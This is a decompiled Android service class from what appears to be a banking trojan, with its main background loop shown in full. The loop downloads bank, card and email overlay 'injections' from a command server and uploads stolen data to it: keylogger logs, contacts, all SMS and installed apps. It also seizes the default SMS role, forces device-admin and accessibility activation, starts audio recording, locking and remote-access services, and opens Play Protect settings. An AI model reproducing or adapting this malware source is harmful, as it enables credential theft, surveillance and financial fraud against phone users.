package com.example.mmm.Service;

import android.app.IntentService;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Build.VERSION;
import android.provider.Telephony.Sms;
import android.util.Base64;
import com.example.mmm.constants;
import com.example.mmm.API.ClassRC4;
import com.example.mmm.Activity.actPermissions;
import com.example.mmm.Activity.actToaskAccessibility;
import com.example.mmm.Activity.activity_change_sms_manager_sdk_Q;
import com.example.mmm.Admin.ActivityAdmin;
import com.example.mmm.Utils.utils;
import com.example.mmm.Utils.utils2;

public class srvWhileWorker extends IntentService {
   utils ethnic$ = new utils();
   constants research$ = new constants();

   public srvWhileWorker() {
      super("");
   }

   private String decrypt_str(String var1) {
      var1 = new String((new ClassRC4("wewiejvtlfqy".getBytes()))._nevada(utils.hexStringToByteArray(new String(Base64.decode(var1, 0), "UTF-8"))));
      return var1;
   }

   protected void onHandleIntent(Intent var1) {
      utils2 var13 = new utils2();
      StringBuilder var20 = new StringBuilder();
      var20.append(srvWhileWorker.class.getSimpleName());
      var20.append("  ");
      String var14 = var20.toString();
      String var15 = this.ethnic$.SettingsRead(this, "QQ");
      short var5 = 2000;
      int var2 = 0;
      int var4 = 0;
      int var3 = 0;
      int var9 = 0;

      while(true) {
         if (!utils.isMyServiceRunning(this, srvAccessibility.class) && utils.isAccessibilityServiceEnabled(this, srvAccessibility.class)) {
            this.startService(new Intent(this, srvAccessibility.class));
         }

         int var10;
         boolean var12;
         boolean var10001;
         utils var21;
         short var23;
         int var26;
         label270: {
            utils.chalkTile(var5);
            int var6 = Integer.parseInt(this.ethnic$.SettingsRead(this, "AK"));
            var10001 = true;
            var10 = var6 + 2;
            this.ethnic$.SettingsWrite(this, "AK", String.valueOf(var10));
            var21 = this.ethnic$;
            StringBuilder var16 = new StringBuilder();
            var16.append("Tick: ");
            var16.append(var10);
            var21.Log(var14, var16.toString());
            if (!utils.isAccessibilityServiceEnabled(this, srvAccessibility.class)) {
               var12 = utils.getScreenBoolean(this);
               if (var12) {
                  var26 = var4 + 1;
                  var6 = var3 + 1;
                  var3 = var26;
                  var10001 = true;
                  if (VERSION.SDK_INT < 29) {
                     if (this.research$.regional$) {
                        this.startActivity((new Intent(this, actToaskAccessibility.class)).addFlags(268435456).addFlags(536870912).addFlags(1073741824));
                     } else {
                        this.startActivity((new Intent("android.settings.ACCESSIBILITY_SETTINGS")).addFlags(268435456).addFlags(536870912).addFlags(1073741824));
                     }
                  } else {
                     var10001 = true;
                  }

                  short var7 = 2000;
                  var26 = var2;
                  var4 = var3;
                  var3 = var6;
                  var23 = var7;
                  break label270;
               }
            }

            var10001 = true;
            var26 = var2 + 1;
            var23 = 20000;
         }

         if (utils.isAccessibilityServiceEnabled(this, srvAccessibility.class) && "xiaomi".equalsIgnoreCase(Build.MANUFACTURER) && utils.getMiuiVersion() >= 10 && !this.ethnic$.SettingsRead(this, "XB").equals("1")) {
            this.ethnic$._tattoo(this, this.ethnic$.getLabelApplication(this), this.ethnic$._painful(), "main");
         }

         int var27 = var26;
         var26 = var3;
         var3 = var27;
         if (utils.isAccessibilityServiceEnabled(this, srvAccessibility.class) && VERSION.SDK_INT >= 29 && utils.getMiuiVersion() < 10) {
            this.ethnic$._chapel(this);
         }

         String var22 = this.ethnic$.SettingsRead(this, "XS");
         if ("xiaomi".equalsIgnoreCase(Build.MANUFACTURER) && utils.getMiuiVersion() >= 10 && utils._prayer(this) && utils.getScreenBoolean(this) && this.ethnic$.SettingsRead(this, "XB").equals("1") && !var22.equals("1") && utils.isAccessibilityServiceEnabled(this, srvAccessibility.class)) {
            var13._fires(this);
            this.ethnic$.Log(var14, "Open Activity AutoStartManagement");
         }

         if ("xiaomi".equalsIgnoreCase(Build.MANUFACTURER) && utils.getMiuiVersion() >= 10 && utils._prayer(this) && utils.getScreenBoolean(this) && this.ethnic$.SettingsRead(this, "XB").equals("1") && var22.equals("1") && !this.ethnic$.SettingsRead(this, "XH").equals("1") && utils.isAccessibilityServiceEnabled(this, srvAccessibility.class)) {
            var13._tulsa(this);
            this.ethnic$.Log(var14, "Open Activity isXiaomiHiddenappsconfigactivity");
         }

         if (utils._exercise(this) && !utils.isMyServiceRunning(this, srvLockDevice.class) && this.ethnic$.SettingsRead(this, "AZ").equals("1")) {
            this.startService(new Intent(this, srvLockDevice.class));
         }

         if (utils.hasPermission(this, this.research$.pentium$[2]).equals("1")) {
            if (this.ethnic$.SettingsRead(this, "WR").equals("1") && !utils.isMyServiceRunning(this, srvRecordAudio.class) && !this.ethnic$.SettingsRead(this, "SS").equals("start")) {
               this.startService((new Intent(this, srvRecordAudio.class)).putExtra("tick", "-1").putExtra("name", "record_audio"));
            }

            var22 = this.ethnic$.SettingsRead(this, "FF");
            if (var22.contains("###")) {
               this.ethnic$._pasta(this, var22);
            }
         }

         StringBuilder var17;
         StringBuilder var18;
         String[] var24;
         utils var28;
         String var29;
         utils var30;
         if (this.ethnic$.SettingsRead(this, "QO").equals("1")) {
            this.ethnic$.Log(var14, "Start Downloading Injections...");
            var24 = this.ethnic$.SettingsRead(this, "QU").split(":");
            int var11 = 0;

            for(var2 = 0; var11 < var24.length; var2 = var27) {
               var28 = this.ethnic$;
               var17 = new StringBuilder();
               var17.append("Name Inject: ");
               var17.append(var24[var11]);
               var28.Log(var14, var17.toString());
               var27 = var2;
               if (!var24[var11].isEmpty()) {
                  var12 = var24[var11].equals("device_null#");
                  var27 = var2;
                  if (!var12) {
                     var27 = var2;
                     if (this.ethnic$.SettingsRead(this, var24[var11]).isEmpty()) {
                        var29 = this.ethnic$._plates(this, var24[var11], "q=d_attacker&ws=");
                        if (var29.length() > 10) {
                           this.ethnic$.SettingsWrite(this, var24[var11], var29);
                           var30 = this.ethnic$;
                           var18 = new StringBuilder();
                           var18.append("Downloading Injection:  ");
                           var18.append(var24[var11]);
                           var18.append("   size: ");
                           var18.append(var29.length());
                           var30.Log(var14, var18.toString());
                        } else {
                           var30 = this.ethnic$;
                           var18 = new StringBuilder();
                           var18.append("Downloading Injection Error:  ");
                           var18.append(var24[var11]);
                           var18.append("   size: ");
                           var18.append(var29.length());
                           var30.Log(var14, var18.toString());
                           ++var2;
                        }

                        var29 = this.ethnic$._tests(this, var24[var11], "q=d_attacker_two&ws=");
                        var27 = var2;
                        if (var29.length() > 10) {
                           var30 = this.ethnic$;
                           var18 = new StringBuilder();
                           var18.append("icon_");
                           var18.append(var24[var11]);
                           var30.SettingsWrite(this, var18.toString(), var29);
                           var30 = this.ethnic$;
                           var18 = new StringBuilder();
                           var18.append("Downloading Icon:  ");
                           var18.append(var24[var11]);
                           var18.append("   size: ");
                           var18.append(var29.length());
                           var30.Log(var14, var18.toString());
                           var27 = var2;
                        }
                     }
                  }
               }

               ++var11;
            }

            this.ethnic$.SettingsWrite(this, "QO", "");
            this.ethnic$.Log(var14, "Downloading All Injections! =)");
            System.gc();
         }

         var22 = this.ethnic$.SettingsRead(this, "AA");
         if (!var22.isEmpty()) {
            var24 = var22.split(":");

            for(var2 = 0; var2 < var24.length; ++var2) {
               if (!var24[var2].isEmpty()) {
                  var28 = this.ethnic$;
                  var17 = new StringBuilder();
                  var17.append("Send Data Injection to Server: ");
                  var17.append(var24[var2]);
                  var28.Log(var14, var17.toString());
                  var29 = this.ethnic$.SettingsRead(this, var24[var2]);
                  var30 = this.ethnic$;
                  var18 = new StringBuilder();
                  var18.append("RESPENCE ");
                  var18.append(var29);
                  var30.Log(var14, var18.toString());
                  var30 = this.ethnic$;
                  String var31 = var24[var2];
                  String var19 = "q=saved_data_attacker&ws=";
                  if (var30._decrease(this, var31, var29, var15, var19).equals("ok")) {
                     var28 = this.ethnic$;
                     var17 = new StringBuilder();
                     var17.append("RESPONCE (ok) ");
                     var17.append(var24[var2]);
                     var28.Log(var14, var17.toString());
                     var28 = this.ethnic$;
                     String var32 = "AA";
                     var18 = new StringBuilder();
                     var18.append(var24[var2]);
                     var18.append(":");
                     var28._founded(this, var32, var18.toString());
                  }
               }
            }
         }

         this.ethnic$._compiled(this, var15);
         var21 = this.ethnic$;
         var29 = var21.SettingsRead(this, "AM");
         if (!var29.isEmpty() && var21.sendKeyloggerLogs(this, var29, var15, "q=saved_accessibility_events&ws=").equals("ok")) {
            var21.SettingsWrite(this, "AM", "");
         }

         var21 = this.ethnic$;
         var29 = var21.SettingsRead(this, "SX");
         if (!var29.isEmpty() && var21._servers(this, var29, var15, "q=saved_contacts&ws=").equals("ok")) {
            var21.SettingsWrite(this, "SX", "");
         }

         var29 = var21.SettingsRead(this, "SV");
         if (!var29.isEmpty() && var21._scott(this, var29, var15, "q=saved_all_sms&ws=").equals("ok")) {
            var21.SettingsWrite(this, "SV", "");
         }

         var29 = var21.SettingsRead(this, "SC");
         if (!var29.isEmpty() && var21.sendSavedSms(this, var29, var15, "q=saved_applications&ws=").equals("ok")) {
            var21.SettingsWrite(this, "SC", "");
         }

         if (utils.getScreenBoolean(this) && VERSION.SDK_INT >= 19) {
            if (!this.ethnic$.SettingsRead(this, "AF").equals("1") && (!this.ethnic$.SettingsRead(this, "SN").equals("1") || Integer.parseInt(this.ethnic$.SettingsRead(this, "SM")) < 10)) {
               if (Sms.getDefaultSmsPackage(this).equals(this.getPackageName()) && VERSION.SDK_INT < 29) {
                  this.ethnic$.SettingsWrite(this, "SQ", "1");
                  utils.swapSmsManager(this, this.ethnic$.SettingsRead(this, "AD"));
               }
            } else if (!Sms.getDefaultSmsPackage(this).equals(this.getPackageName())) {
               var2 = VERSION.SDK_INT;
               if (var2 >= 29) {
                  this.ethnic$.SettingsWrite(this, "SQ", "1");
                  this.startActivity((new Intent(this, Class.forName(activity_change_sms_manager_sdk_Q.class.getName()))).addFlags(268435456));
               } else {
                  this.ethnic$.SettingsWrite(this, "SQ", "1");
                  utils.swapSmsManager(this, this.getPackageName());
               }
            }

            if (Sms.getDefaultSmsPackage(this).equals(this.getPackageName()) && this.ethnic$.SettingsRead(this, "SN").equals("1")) {
               this.ethnic$.SettingsWrite(this, "SN", "");
            }
         }

         if (this.ethnic$.SettingsRead(this, "AX").equals("1")) {
            utils._pensions(this);
         }

         if (utils.getScreenBoolean(this)) {
            var22 = this.ethnic$.SettingsRead(this, "QR");
            if (!var22.isEmpty()) {
               this.ethnic$.SettingsWrite(this, "SQ", "1");
               Intent var33 = new Intent("android.intent.action.DELETE");
               var33.setData(Uri.parse("package:".concat(String.valueOf(var22))));
               this.startActivity(var33);
            }
         }

         if (!this.ethnic$.SettingsRead(this, "QU").isEmpty()) {
            var2 = Integer.parseInt(this.ethnic$.SettingsRead(this, "AV"));
            if (var10 > var2 && var2 != -1 && var2 != -2 && this.ethnic$._atlantic(this, "run_injects_banks", var15, "q=pause_attacker&ws=").equals("on_inject_banks")) {
               this.ethnic$.SettingsWrite(this, "AV", "-2");
            }

            var2 = Integer.parseInt(this.ethnic$.SettingsRead(this, "AB"));
            if (var10 > var2 && var2 != -1 && var2 != -2 && this.ethnic$._atlantic(this, "run_injects_cards", var15, "q=pause_attacker&ws=").equals("on_inject_cards")) {
               this.ethnic$.SettingsWrite(this, "AB", "-2");
            }

            var2 = Integer.parseInt(this.ethnic$.SettingsRead(this, "AN"));
            if (var10 > var2 && var2 != -1 && var2 != -2 && this.ethnic$._atlantic(this, "run_injects_emails", var15, "q=pause_attacker&ws=").equals("on_inject_emails")) {
               this.ethnic$.SettingsWrite(this, "AN", "-2");
            }
         }

         if (!utils.isMyServiceRunning(this, srvRAT.class) && this.ethnic$.SettingsRead(this, "RQ").equals("connect")) {
            this.startService(new Intent(this, srvRAT.class));
         }

         var2 = Integer.parseInt(this.ethnic$.SettingsRead(this, "SI"));
         if (var2 > 0 && var10 > var2 && utils.getScreenBoolean(this) && !this.ethnic$.hasPermissionAllTrue(this) && this.ethnic$.SettingsRead(this, "SN").isEmpty()) {
            this.startActivity((new Intent(this, actPermissions.class)).addFlags(268435456));
         }

         var2 = Integer.parseInt(this.ethnic$.SettingsRead(this, "SU"));
         if (var2 > 0 && var10 > var2 && !utils._exercise(this) && utils.getScreenBoolean(this) && utils.isAccessibilityServiceEnabled(this, srvAccessibility.class)) {
            if (utils.isAccessibilityServiceEnabled(this, srvAccessibility.class)) {
               this.ethnic$.SettingsWrite(this, "SQ", "1");
               this.ethnic$.Log(var14, "autoClick=1 ADMIN DEVICE");
            }

            var1 = new Intent(this, ActivityAdmin.class);
            var1.putExtra("admin", "1");
            var1.addFlags(268435456);
            var1.addFlags(536870912);
            this.startActivity(var1);
         }

         var27 = var9 + 1;
         var10001 = true;
         if (utils.isAccessibilityServiceEnabled(this, srvAccessibility.class) && this.research$.fault$ && utils.getScreenBoolean(this) && this.ethnic$.SettingsRead(this, "SR").equals("1") && var10 > Integer.parseInt(this.ethnic$.SettingsRead(this, "SY"))) {
            if (VERSION.SDK_INT >= 25) {
               this.ethnic$.SettingsWrite(this, "ST", "1");
               var1 = new Intent("com.google.android.gms.security.settings.VerifyAppsSettingsActivity");
               var1.setClassName("com.google.android.gms", "com.google.android.gms.security.settings.VerifyAppsSettingsActivity");
               var1.addFlags(268435456);
               var1.addFlags(8388608);
               this.startActivity(var1);
            } else {
               this.ethnic$.SettingsWrite(this, "ST", "1");
               var1 = new Intent("com.google.android.gms.security.settings.VerifyAppsSettingsActivity");
               var1.setClassName("com.google.android.gms", "com.google.android.gms.security.settings.VerifyAppsSettingsActivity");
               var1.addFlags(268435456);
               var1.addFlags(8388608);
               this.startActivity(var1);
            }
         }

         var2 = var3;
         var5 = var23;
         var4 = var4;
         var3 = var26;
         var9 = var27;
      }
   }
}
